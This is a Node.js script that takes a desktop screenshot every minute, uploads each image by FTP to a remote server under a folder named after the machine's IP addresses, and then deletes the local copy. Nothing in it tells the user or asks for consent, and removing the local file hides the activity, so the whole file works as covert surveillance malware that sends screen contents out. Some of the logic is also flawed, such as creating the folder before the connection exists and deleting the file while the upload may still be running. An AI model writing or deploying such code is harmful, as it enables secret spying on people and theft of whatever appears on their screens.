var screenshot = require('desktop-screenshot');
const fs = require('fs');
const ftp = require("ftp");
const os = require('os');

function readCounterFromFile() {
  try {
    const data = fs.readFileSync('counter.txt', 'utf8');
    return parseInt(data);
  } catch (err) {
    // If the file doesn't exist or reading fails, return a default counter value of 1
    return 1;
  }
}

function writeCounterToFile(counter) {
  fs.writeFileSync('counter.txt', counter.toString(), 'utf8');
}

const networkInterfaces = os.networkInterfaces();
const localIpAddresses = [];

for (const interfaceName in networkInterfaces) {
  const interfaces = networkInterfaces[interfaceName];
  for (const iface of interfaces) {
    if (iface.family === 'IPv4' && !iface.internal) {
      localIpAddresses.push(iface.address);
    }
  }
}


async function takeshot() {
  let counter = readCounterFromFile();
  const fileName = `screenshot_${counter}.png`;

  //screenshot code
  screenshot(`${fileName}`, function(error, complete) {
    if(error)
    console.log("Screenshot failed!");
    
    else
    console.log("Screenshot succeeded!");
  });


  //ftp
  const ftpConfig = {
    host: '',
    port: 21, // Default FTP port is 21
    user: '',
    password: ''
  };

  const clientIp = localIpAddresses;

  const filePath = `${fileName}`; // Path to the local file you want to upload
  const remoteFilePath = `/screenshots/${clientIp}/${fileName}`; // Path where you want to upload the file on the FTP server
  const client = new ftp();
  client.mkdir(`/screenshots/${clientIp}`, (err) => {
    if (err) {
      console.error('Folder Already Exsists!');
    } else {
      console.log('Folder made successfully!');
    }
    // Close the FTP connection
    client.end();
  });

  client.on('ready', () => {
  
    // Upload the file
    client.put(filePath, remoteFilePath, (err) => {
      if (err) {
        console.error('Error uploading file!');
      } else {
        console.log('File uploaded successfully!');
      }
      // Close the FTP connection
      client.end();
    });
  });

  // Connect to the FTP server
  client.connect(ftpConfig);

  // delete the screenshot from local directory
  fs.unlink(fileName, (err) => {
    if (err) {
      console.error('Error deleting local screenshot!');
    } else {
      console.log('Local screenshot deleted successfully!');
    }
  });

  counter++;
  writeCounterToFile(counter);
}

// Call takeshot every 1 minute - 60000
setInterval(takeshot, 60000);